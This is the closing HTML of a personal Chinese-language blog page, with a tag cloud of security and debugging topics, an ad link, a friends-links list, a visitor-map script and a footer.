style="font-size: 10px;">x64</a> <a href="/tags/内核/" style="font-size: 12px;">内核</a> <a href="/tags/内核结构/" style="font-size: 14px;">内核结构</a> <a href="/tags/反病毒/" style="font-size: 16px;">反病毒</a> <a href="/tags/安全机制/" style="font-size: 10px;">安全机制</a> <a href="/tags/异常处理/" style="font-size: 10px;">异常处理</a> <a href="/tags/提权/" style="font-size: 12px;">提权</a> <a href="/tags/服务/" style="font-size: 10px;">服务</a> <a href="/tags/权限/" style="font-size: 12px;">权限</a> <a href="/tags/栈溢出漏洞/" style="font-size: 10px;">栈溢出漏洞</a> <a href="/tags/测试/" style="font-size: 10px;">测试</a> <a href="/tags/漏洞调试/" style="font-size: 12px;">漏洞调试</a> <a href="/tags/生活/" style="font-size: 14px;">生活</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/西安/" style="font-size: 10px;">西安</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/读书/" style="font-size: 10px;">读书</a> <a href="/tags/调试/" style="font-size: 14px;">调试</a> <a href="/tags/转换/" style="font-size: 10px;">转换</a> <a href="/tags/进程/" style="font-size: 10px;">进程</a> <a href="/tags/逆向/" style="font-size: 10px;">逆向</a> <a href="/tags/重庆/" style="font-size: 10px;">重庆</a> <a href="/tags/驱动/" style="font-size: 14px;">驱动</a>
  </div>
</div>


  
  <div class="widget-wrap">
   <a href="https://curl.qcloud.com/MpoJ5iCM"> <img src="/img/ad.jpg" /> </a>
  </div>


  <div class="widget tag">
<h3 class="title">Links</h3>
<ul class="entry">
<li><a href="http://blog.ourren.com/" title="Ourren">Ourren</a></li>
<li><a href="http://www.hyjal.net/" title="Hyjal">Hyjal</a></li>
<li><a href="http://www.jianshu.com/users/fa15f4e416ae/latest_articles" title="Daemonceltics">Daemonceltics</a></li>
<li><a href="http://papap.info/" title="isee">isee</a></li>
</ul>
</div>

  <script type="text/javascript" id="clustrmaps" src="//cdn.clustrmaps.com/map_v2.js?u=putG&d=yoFnN6V-ovhL-H4e9_69LvkTiX4uX7rEYJ15yL3G1Wg"></script>
</aside>
    <div class="clearfix"></div>
  </div>
  <div id="go-pg-top"><i class="icon-arrow-up"></i></div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2021 Lyon
  
</div>
<div class="clearfix"></div></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript" charset="utf-8" src="/js/page.js"></script>

</body>

</html>